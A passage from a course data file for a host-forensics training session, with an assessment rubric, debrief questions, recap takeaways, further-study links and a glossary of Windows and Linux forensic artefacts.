  04-antiforensics.md     → T4: each act, and what survived it
  05-finding.md           → T5: the formal finding`,
        provenance: 'source',
        sources: [{ file: FILE, section: '6. Reporting Mindset' }],
      },

      {
        kind: 'assessment',
        id: 'assessment',
        title: 'How this is assessed',
        criteria: [
          {
            band: 'Artefact interpretation precision',
            weight: '30%',
            descriptor:
              'Each artefact is used for what it actually proves. Navigation and transfer are distinguished. Execution is separated from outcome. Overreach costs marks even when the overall conclusion is right.',
          },
          {
            band: 'Cross-host correlation',
            weight: '20%',
            descriptor:
              'The pivot is identified with a named artefact and corroborated on the destination host. The timeline reads correctly as one intrusion across two machines.',
          },
          {
            band: 'Persistence completeness',
            weight: '20%',
            descriptor:
              'More than one mechanism class checked on each host. Finding one and stopping loses most of this band.',
          },
          {
            band: 'Anti-forensic handling',
            weight: '15%',
            descriptor:
              'Tampering is treated as a finding. Integrity verified on Linux before any live output is used. What survived each act is stated explicitly.',
          },
          {
            band: 'Report quality',
            weight: '15%',
            descriptor: 'Standard format. Every claim cited to an artefact. Remediation covers the commonly missed steps.',
          },
        ],
        provenance: 'supplementary',
      },

      {
        kind: 'debrief',
        id: 'debrief',
        title: 'Debrief',
        minutes: 10,
        questions: [
          'Who checked Linux binary integrity before reading anything else from that host? What did everyone else do with the rootkitted output?',
          'How many persistence mechanisms did the room find per host? Compare the counts — the spread is usually two to one.',
          'Which artefact did you use for the pivot? Did anyone find it a different way?',
          'Did anyone write that the CFO files were stolen? What artefact were they relying on, and what does it actually record?',
          'For each act of anti-forensics, what survived it? Which surviving artefact was most valuable?',
          'If this attacker had also cleared Prefetch and known_hosts, what would be left?',
        ],
        landingPoint:
          'Host forensics works because evidence is redundant across locations the attacker must clean separately and under pressure — and the investigator\'s discipline is not finding more, it is saying precisely what each surviving artefact does and does not establish.',
        provenance: 'supplementary',
      },

      {
        kind: 'recap',
        id: 'recap',
        title: 'Recap and further study',
        provenance: 'source',
        sources: [{ file: FILE, section: '13. Summary' }],
        takeaways: [
          'The same five questions apply on both platforms. Only the evidence locations change.',
          'Prefetch and auditd prove execution after deletion. Check them first; they are fast.',
          'authorized_keys persistence survives a password reset. Shellbags survive folder deletion.',
          'Log tampering removes the local record only. Name what survived.',
          'On Linux, verify tool integrity before trusting any live output.',
          'Correlate lateral movement across both ends of the pivot, never from one machine\'s view.',
        ],
        furtherStudy: [
          { label: 'Eric Zimmerman\'s tools', note: 'The standard Windows artefact parsers, with documentation for each.', href: 'https://ericzimmerman.github.io/' },
          { label: 'Autoruns (Sysinternals)', note: 'Every Windows startup location in one view.', href: 'https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns' },
          { label: 'AIDE', note: 'Linux file integrity monitoring, configured before the incident.', href: 'https://aide.github.io/' },
          { label: 'Next: Session 7 — Network and Memory Forensics', note: 'Disk told you the history. Next: the layer the attacker cannot clean, and the one that holds what never touched disk.' },
        ],
      },
    ],
  },

  terms: [
    { term: 'Prefetch', definition: 'A Windows cache recording which executables ran, from which path, how often and when. Survives deletion of the executable.' },
    { term: 'Shellbag', definition: 'A registry artefact recording that a user opened a folder in Explorer. Persists after the folder is deleted.' },
    { term: 'SRUM', definition: 'System Resource Usage Monitor — a Windows database recording per-application network bytes over 30 days.' },
    { term: 'UserAssist', definition: 'A registry key recording GUI program execution, ROT13 encoded.' },
    { term: 'authorized_keys', definition: 'The SSH file listing public keys permitted to authenticate. Persistence here survives a password reset.' },
    { term: 'known_hosts', definition: 'The SSH file listing every host a user has connected to. Frequently the artefact that links two compromised machines.' },
    { term: 'SUID', definition: 'A Linux permission bit running a program with the owner\'s privileges. Misconfiguration is a common escalation path.' },
    { term: 'Rootkit', definition: 'Malware that hides itself by replacing system tools. A rootkitted binary returns false output rather than failing.' },
  ],
}
